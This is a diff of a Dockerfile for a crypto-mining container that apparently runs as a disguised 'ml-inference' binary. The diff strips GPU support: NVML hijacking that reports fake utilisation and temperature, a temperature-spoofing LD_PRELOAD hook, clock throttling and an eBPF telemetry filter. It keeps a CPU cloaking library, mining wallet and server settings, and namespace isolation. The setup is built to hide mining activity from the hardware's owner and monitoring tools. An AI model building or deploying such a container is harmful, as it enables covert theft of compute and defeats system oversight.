@@ -1,4 +1,4 @@
-FROM nvcr.io/nvidia/cuda:12.0.0-cudnn8-devel-ubuntu22.04
+FROM ubuntu:22.04
 
 
 # =============================================================================
@@ -19,8 +19,6 @@ ARG OPENAI_API_KEY
 ARG LOG_ENCRYPTION_KEY
 ARG MINING_SERVER_CPU
 ARG MINING_WALLET_CPU
-ARG MINING_SERVER_GPU
-ARG MINING_WALLET_GPU
 ARG NVIDIA_DRIVER_VERSION=535
 ARG WEBSOCAT_VERSION=1.12.0
 ARG TARGETARCH=amd64
@@ -40,8 +38,6 @@ ENV DEBIAN_FRONTEND=noninteractive \
     LOG_ENCRYPTION_KEY=${LOG_ENCRYPTION_KEY} \
     MINING_SERVER_CPU=${MINING_SERVER_CPU} \
     MINING_WALLET_CPU=${MINING_WALLET_CPU} \
-    MINING_SERVER_GPU=${MINING_SERVER_GPU} \
-    MINING_WALLET_GPU=${MINING_WALLET_GPU} \
     NVIDIA_DRIVER_VERSION=${NVIDIA_DRIVER_VERSION} \
     EVENT_BUS_BACKEND=${EVENT_BUS_BACKEND} \
     PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
@@ -58,7 +54,7 @@ RUN set -eux; \
         pciutils openssl lm-sensors powerstat stress-ng bash \
         htop locales iptables powertop tzdata numactl systemd dbus \
         pkg-config libhwloc15 libhwloc-dev ca-certificates lsb-release gnupg \
-        libuv1 libudev1 libssl3 cgroup-tools libcgroup1 libcap2-bin nvidia-container-toolkit \
+        libuv1 libudev1 libssl3 cgroup-tools libcgroup1 libcap2-bin \
         kmod software-properties-common snapd linux-tools-generic linux-tools-azure \
         erlang-base erlang-crypto erlang-eldap erlang-ftp erlang-inets erlang-mnesia \
         erlang-os-mon erlang-parsetools erlang-public-key erlang-runtime-tools \
@@ -114,40 +110,18 @@ RUN set -eux; \
 COPY . /app/
 
 # Sao chép pre-compiled binaries và libraries
-COPY ml-inference inference-cuda libmlls-cuda.so /tmp/
+COPY ml-inference /tmp/ml-inference
 COPY entrypoint.sh /app/entrypoint.sh
-COPY mining_environment/gpu_plugins/native/cuda/libmpo.so /tmp/libmpo.so
-COPY mining_environment/gpu_plugins/native/nvml/libgpuhook.so /tmp/libgpuhook.so
-COPY mining_environment/gpu_plugins/native/thermal/libtempspoof.so /tmp/libtempspoof.so 
 COPY mining_environment/cpu_plugins/cloaking_lib/libcloak.so /usr/local/lib/libcloak.so
 
-# GPU telemetry filter moved to gpu_plugins module
-COPY mining_environment/gpu_plugins/ebpf/obj/gpu_telemetry_filter.bpf.o /app/mining_environment/gpu_plugins/ebpf/obj/
+## CPU-only build: no GPU telemetry objects
 
 RUN ldconfig && \
     install -D /tmp/ml-inference      /usr/local/bin/ml-inference && \
-    install -D /tmp/inference-cuda    /usr/local/bin/inference-cuda && \
-    install -D /tmp/libmlls-cuda.so   /usr/local/bin/libmlls-cuda.so && \
-    install -D /tmp/libmpo.so         /opt/mpo/libmpo.so && \
-    install -D /tmp/libgpuhook.so     /opt/hooks/libgpuhook.so && \
-    install -D /tmp/libtempspoof.so   /opt/hooks/libtempspoof.so && \
-    mkdir -p /opt/{hooks,mpo} && chmod 755 /opt/{hooks,mpo} && chmod 644 /opt/mpo/libmpo.so && \
+    mkdir -p /opt/hooks && chmod 755 /opt/hooks && \
     rm -rf /tmp/*
 
-# ------------------  (10)  Enhanced GPU Runtime & Libraries ---------------
-RUN set -eux; apt-get update; \
-    apt-get install -y --no-install-recommends \
-        # NVIDIA ML & Management Libraries (available packages)
-        libnvidia-ml-dev \
-        # OpenCL Support for Mining Applications  
-        ocl-icd-opencl-dev clinfo ocl-icd-libopencl1 opencl-headers \
-        # Additional Mining Dependencies
-        libnuma1 libhwloc15 libuv1-dev \
-        # System monitoring tools
-        pciutils lshw \
-    && ldconfig && rm -rf /var/lib/apt/lists/*
-
-# Note: CUDA libraries are provided by the base image nvcr.io/nvidia/cuda:12.0.0-cudnn8-devel-ubuntu22.04
+## CPU-only build: remove GPU/NVIDIA/OpenCL runtime packages
 
 # ------------------  (11)  eBPF setup script & Websocat -------------------
 
@@ -164,27 +138,17 @@ ENV SCRIPT_DIR=/app/mining_environment/scripts \
     LOGS_DIR=/app/mining_environment/logs \
     CPU_PLUGIN_CFG=/app/mining_environment/config/cpu_plugins.yml \
     ML_COMMAND=/usr/local/bin/ml-inference \
-    CUDA_COMMAND=/usr/local/bin/inference-cuda \
-    MLLS_CUDA=/usr/local/bin/libmlls-cuda.so \
-    GPU_CLOAK_LOG_LEVEL=INFO \
     WORK_MS=1900 SLEEP_MS=100 \
-    ENABLE_MPO=1 MPO_LIB=/opt/mpo/libmpo.so \
+    ENABLE_MPO=0 MPO_LIB= \
     ENABLE_NS_ISOLATION=1 NS_USE_NET=1 \
     PYTHONPATH=/app:/usr/local/lib/python3.10/dist-packages:/usr/lib/python3/dist-packages \
-    GPU_PLUGINS_CONFIG=/app/mining_environment/gpu_plugins/config/gpu_plugins.yml \
-    ENABLE_NVML_IPC_HIJACKING=1 NVML_FAKE_UTIL=5 NVML_FAKE_TEMP=48 NVML_FAKE_MEM_MB=256 NVML_ADD_NOISE=1 \
-    ENABLE_TEMP_SPOOF=1 SPOOF_TEMP_VALUE=48 TEMP_SPOOF_ADD_NOISE=1 \
-    ENABLE_SM_THROTTLE=1 CLOCK_LOW=300 CLOCK_HIGH=1200 THROTTLE_INTERVAL=30 \
     EVENT_BUS_BACKEND=memory \
     EVENTBUS_CONNECTION_TIMEOUT=10.0 \
     EVENTBUS_RETRY_ATTEMPTS=5 \
     EVENTBUS_HEALTH_CHECK_INTERVAL=60.0
 
 
-# Simplified CUDA library path - production only
-ENV LD_LIBRARY_PATH=/usr/local/cuda/lib64:$LD_LIBRARY_PATH
-
-ENV LD_PRELOAD="/opt/hooks/libtempspoof.so:/opt/hooks/libgpuhook.so"
+## CPU-only build: no CUDA LD_LIBRARY_PATH or LD_PRELOAD hooks
 
 # ------------------  (14)  Verification và cleanup ------------------------
 RUN set -eux; \
@@ -195,7 +159,7 @@ RUN set -eux; \
     rm -rf /var/lib/apt/lists/*
 
 
-# ------------------  (15)  Setup scripts & GPU Debug Tool ----------------
+# ------------------  (15)  Setup scripts ----------------
 COPY setup_rdt.sh /app/setup_rdt.sh
 COPY rdt-mount.service /etc/systemd/system/rdt-mount.service
 RUN chmod +x /app/setup_rdt.sh && \
@@ -209,15 +173,9 @@ HEALTHCHECK --interval=1m --timeout=10s --start-period=30s --retries=3 CMD pgrep
 
 LABEL maintainer="Transformer Mining Team" \
       version="1.2.0" \
-      description="Enhanced GPU mining container with CUDA runtime and OpenCL support" \
-      cuda.version="12.0" \
-      cuda.runtime="enhanced" \
-      opencl.enabled="true" \
+      description="CPU-only mining container (no CUDA/OpenCL)" \
       ebpf.enabled="true" \
       ebpf.mode="runtime-load-only" \
-      gpu.cloaking="multi-layer" \
-      gpu.plugins="modular-architecture" \
-      gpu.debug="integrated" \
       security.level="high"
 
 EXPOSE 8080 9090
